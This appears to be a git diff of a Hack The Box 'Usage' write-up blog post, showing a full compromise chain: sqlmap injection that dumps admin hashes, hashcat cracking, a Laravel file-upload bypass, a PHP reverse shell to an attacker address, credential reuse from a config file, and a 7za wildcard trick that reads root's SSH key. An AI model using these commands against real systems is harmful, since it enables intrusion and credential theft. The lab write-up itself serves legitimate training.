@@ -17,7 +17,7 @@ As usual for an easy box, I set up a basic scan of the IP
 nmap -sC -sV 10.10.11.18
 {% endhighlight%}
 
-![nmap results](/assets/images/Usage/nmap%20results.png)
+![screenshot](/assets/images/Usage/nmap%20results.png)
 
 Looks like we have ports open for ssh and http. It gives us the host name, so we can add this to /etc/hosts to access the page. This is pretty typical, but I like to set up a more detailed scan to run in the background while I check out the webpage. I'll try to run directory busting too, to cover my bases.
 
@@ -31,24 +31,26 @@ nmap -sC -sV -p- A usage.htb
 dirb http://usage.htb/ /usr/share/wordlists/dirb/common.txt
 
 dirb http://admin.usage.htb/ /usr/share/wordlists/dirb/common.txt
-{% endhighlight%}
+{% endhighlight %}
 
-![nmap results](/assets/images/Usage/dir%20results%20base.png)
-![nmap results](/assets/images/Usage/dirb%20results%20admin.png)
+![screenshot](/assets/images/Usage/dir%20results%20base.png)
+![screenshot](/assets/images/Usage/dirb%20results%20admin.png)
 
 While that's running, I can check out the web page. Landing page is a login form. There are also links to "Register" and "Admin". "Admin" gives us a subdomain that we can add. 
 
-![nmap results](/assets/images/Usage/landing%20page.png)
+![screenshot](/assets/images/Usage/landing%20page.png)
 
+{% highlight bash %}
 echo "10.10.11.18 admin.usage.htb" | sudo tee -a /etc/hosts
 tail /etc/hosts
+{% endhighlight %}
 
-![nmap results](/assets/images/Usage/admin%20portal.png)
+![screenshot](/assets/images/Usage/admin%20portal.png)
 
 Inspecting the admin page gives us version numbers for jQuery 2.1.4 and Bootstrap 3.3.5 as well as laravel_session and XSRF-TOKEN cookies. 
 
-![nmap results](/assets/images/Usage/inspect%20results.png)
-![nmap results](/assets/images/Usage/inspect%20cookie%20results.png)
+![screenshot](/assets/images/Usage/inspect%20results.png)
+![screenshot](/assets/images/Usage/inspect%20cookie%20results.png)
 
 Since version numbers are always worth checking out, I spent some time googling the information I have so far. I found potential XSS and Prototype Pollution vulnerabilities for jQuery, but no public exploits. Bootstrap versions earlier than 3.4.1 also appear vulnerable to XSS, but it requires tooltip/popover elements. Larvel is a framework for web apps, and there are multiple vulnerabilites listed, but without the version number I can't tell which could be targets. However, I did note that Laravel is PHP based.
 
@@ -56,7 +58,7 @@ I've now got a list of vulnerabilites I could start researching, but I'm going t
 
 I try Laravel default credentials for the admin page with no luck. However, registering for the site actually works, and shows me four blog posts with a little HTB hint about Server Side Penetration testing and another pointer towards Laravel using PHP. Unfortunately, theres no additional access, and my registered credentials don't work on the admin page. 
 
-![nmap results](/assets/images/Usage/blog%20posts.png)
+![screenshot](/assets/images/Usage/blog%20posts.png)
 
 At this point I circle back to my running searches. Nmap didn't return anything new, but the dirb search on admin.usage gave us /uploads, with a /images subdirectory as well as /vendor. Unfortunately I get a 403 when I try to access either of these. 
 
@@ -64,7 +66,7 @@ XSRF seems unlikely because there are tokens in place. I try some XSS checks as 
 
 Firing up Burpsuite, I sent the request to the repeater, and spent some time looking through the response without gaining any additional insight. After multiple attempts, I finally got this command put together: 
 
-{% highlight bash %} 
+{% highlight bash %}
 sqlmap -r burp.txt -p 'email' --level=5 --risk=3 v 7 --batch --dbs
 {% endhighlight%}
 
@@ -86,33 +88,33 @@ Which breaks down into the following:
 
 And got 3 databases:
 
-![nmap results](/assets/images/Usage/sqlmap%20results.png)
+![screenshot](/assets/images/Usage/sqlmap%20results.png)
 
-![nmap results](/assets/images/Usage/sqlmap%20db%20type.png)
+![screenshot](/assets/images/Usage/sqlmap%20db%20type.png)
 
 I then ran the following to get the tables and dump the info of admin_users, adding in the DB type to make it run a little faster. 
 
-{% highlight bash %} 
+{% highlight bash %}
 sqlmap -r burp.txt -p 'email' --dbms=mysql --level=5 --risk=3 -v 7 --batch -D usage_blog --tables
 {% endhighlight%}
 
-{% highlight bash %} 
+{% highlight bash %}
 sqlmap -r burp.txt -p 'email' --dbms=mysql --level=5 --risk=3 -v 7 --batch -D usage_blog -T admin_users --dump
 {% endhighlight%}
 
 which yielded a nice hash for admin.
 
-![nmap results](/assets/images/Usage/slqmap%20tables.png)
+![screenshot](/assets/images/Usage/slqmap%20tables.png)
 
-![nmap results](/assets/images/Usage/sqlmap%20hash.png)
+![screenshot](/assets/images/Usage/sqlmap%20hash.png)
 
 I then used https://hashes.com/en/tools/hash_identifier to identify the hash as bcrypt, and dropped it into a text file with vim. Hashcat gets put into work next and quickly yields admin:whatever1. Good ol' rockyou!
 
 {% highlight bash %}
- hashcat -m 3200 -a 0 adminhash.txt /usr/share/wordlists/rockyou.txt.gz
- {% endhighlight%}
+hashcat -m 3200 -a 0 adminhash.txt /usr/share/wordlists/rockyou.txt.gz
+{% endhighlight%}
 
-![nmap results](/assets/images/Usage/hashcat%20output.png)
+![screenshot](/assets/images/Usage/hashcat%20output.png)
 
 Worth trying over ssh, but no dice. The admin page works though, and takes us to the dashboard. The dashboard immediately gives some information, including the version of laravel I was missing earlier- 10.18.0.
 
@@ -121,19 +123,20 @@ https://flyd.uk/post/cve-2023-24249/.
 
 Replicating the POC was another story. I found this part to be very particular with how and when each step was performed. I started with a text.jpg file, and found I had to hit submit in the browser, quickly intercept that request, modify the extension to .php, and quickly refresh the browser to make it accept the alternate extension. 
 
-![nmap results](/assets/images/Usage/admin%20uploaddd%20pic.png)
+![screenshot](/assets/images/Usage/admin%20uploaddd%20pic.png)
 
 Once I got the process nailed down, I started trying php reverse shells from https://www.revshells.com/ ("activating" by visting the files location in the /uploads/images directory I found with the earlier scan), but got no success until this one: 
 
-![nmap results](/assets/images/Usage/php-html%20shell%20pic.png)
+![screenshot](/assets/images/Usage/php-html%20shell%20pic.png)
 
 Which seemed to only be able to execute php commands, and I was not able to navigate any filesystem with. So I doubled down on the php revshells, set up a listener, and inserted another reverse shell command into my malicious web page. 
 
-{% highlight bash %} 
-ifconfig 
-
+{% highlight bash %}
+ifconfig
+{% endhighlight%}
 (grab listener address)
 
+{% highlight bash %}
 nc -nvlp 8001
 
 php -r '$sock=fsockopen("10.10.14.54",8001);exec("sh<&3>&3 2>&3");'
@@ -141,17 +144,17 @@ php -r '$sock=fsockopen("10.10.14.54",8001);exec("sh<&3>&3 2>&3");'
 
 and I finally catch a shell! We can even get the user flag from here.
 
-![nmap results](/assets/images/Usage/reverse%20shell.png)
+![screenshot](/assets/images/Usage/reverse%20shell.png)
 
-{% highlight bash %} 
-cd ~ 
+{% highlight bash %}
+cd ~
 
 cat user.txt
 {% endhighlight%}
 
 The box has python so we can upgrade our shell
 
-{% highlight bash %} 
+{% highlight bash %}
 python3 --version
 
 python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -159,7 +162,7 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 This was my least favorite part. I spent a decent amount of time looking around the box, trying to find something useful. I can see another user, "xander", but can't access their directory. I found plaintext database credentials in /var/www/html/project_admin/.env
 
-![nmap results](/assets/images/Usage/db%20pass.png)
+![screenshot](/assets/images/Usage/db%20pass.png)
 
 But this just gives access to the mysql db I was in earlier, and the password hasn't been reused for xander, root, or admin. My search was primarily through the /var/www/html, hoping to find some type of password reuse. It wasn't until (much later) that I returned to the home directory and looked for hidden files that I finally hit paydirt. It appears there is a monitoring utility that needs some plaintext passwords to run.
 
@@ -170,27 +173,27 @@ But this just gives access to the mysql db I was in earlier, and the password ha
 cat .monitrc
 {% endhighlight%}
 
-![nmap results](/assets/images/Usage/monitrc%20pass.png)
+![screenshot](/assets/images/Usage/monitrc%20pass.png)
 
 Luckily, this password is reused, and I can ssh to xander. 
 
-{% highlight bash %} 
+{% highlight bash %}
 ssh xander@10.10.11.18
 {% endhighlight%}
 
-![nmap results](/assets/images/Usage/xander%20ssh%20access.png)
+![screenshot](/assets/images/Usage/xander%20ssh%20access.png)
 
 And now I can start down my privilege escalation checklist. Almost immediately I find something interesting. 
 
-{% highlight bash %} 
+{% highlight bash %}
 sudo -l
 {% endhighlight%}
 
-![nmap results](/assets/images/Usage/sudo%20-l.png)
+![screenshot](/assets/images/Usage/sudo%20-l.png)
 
 Given that the name of the box is "Usage", I'm gonna prioritize this binary. Diving right in, I see that it givecs three options - project backup, backup MySQL data, reset admin password.
 
-{% highlight bash %} 
+{% highlight bash %}
 cd /usr/bin
 
 sudo usage_management
@@ -199,17 +202,17 @@ sudo usage_management
 
 3 looks like fun, so I start there, but I don't get to choose what it resets to, or get any insight into what it changes to. Since it's unlikely to reset the root password anyway, I keep it moving. 2 doesn't print out anything useful either, but 1 has some output as it runs. 
 
-![nmap results](/assets/images/Usage/sudo%20usage_management.png)
+![screenshot](/assets/images/Usage/sudo%20usage_management.png)
 
 It looks from the output like it uses 7-zip to open /var/backups/project.zip and update it. Checking out this directory, I have read access, but not write, so I won't be able to manipulate the zip file to try to take advantage of the program in any way. Same goes for the actual 7-zip binary. I spend a while trying to manipulate the path to make it open my own zip file, or to make my own usage_management run, but I only succeed in royally messing up my path. I even look at gtfo bins for 7z, but since I can't run the command as sudo directly, its not helpful. 
 
 Finally, I get smart enough to run strings.
 
-{% highlight bash %} 
+{% highlight bash %}
 strings usage_management
 {% endhighlight%}
 
-![nmap results](/assets/images/Usage/strings.png)
+![screenshot](/assets/images/Usage/strings.png)
 
 With strings, I can see a little better how 7za is being used. Specifically: 
 
@@ -238,7 +241,7 @@ From what I understand, if you have write permissions to the folder 7z targets (
 
 Now, I could grab root.txt directly, but I would rather go full escalation and grab the ssh key instead. 
 
-{% highlight bash %} 
+{% highlight bash %}
 cd /var/www/html
 
 touch @id_rsa
@@ -248,7 +251,7 @@ ln -s /root/.ssh/id_rsa id_rsa
 sudo /usr/bin/usage_management
 {% endhighlight%}
 
-![nmap results](/assets/images/Usage/ssh%20key.png)
+![screenshot](/assets/images/Usage/ssh%20key.png)
 
 Bingo! I just copy into a .pem file and format correctly, then change the permissions. 
 
@@ -260,12 +263,12 @@ ssh -i sshkey.pem root@10.10.11.18
 
 and we have root!
 
-![nmap results](/assets/images/Usage/root.png)
+![screenshot](/assets/images/Usage/root.png)
 
 I spent a little while enjoying my root privileges by exploring the privesc exploit. Despite what hacktricks says about the importance of the options, I was able to get the error for the file leak without any of the command options. It appears the wildcard enabling the reading of "@file" was enough, suggesting this exploit might be viable in a wider set of circumstances than I originally thought. A good trick to keep in the back pocket!
 
-![nmap results](/assets/images/Usage/no%20options.png)
+![screenshot](/assets/images/Usage/no%20options.png)
 
 I also found the script responsible for driving me crazy during the file upload attack portion. It says it only runs every 3 minutes, but I was finding my files cleared out much more often. Annoying.
 
-![nmap results](/assets/images/Usage/cleanup.png)
+![screenshot](/assets/images/Usage/cleanup.png)
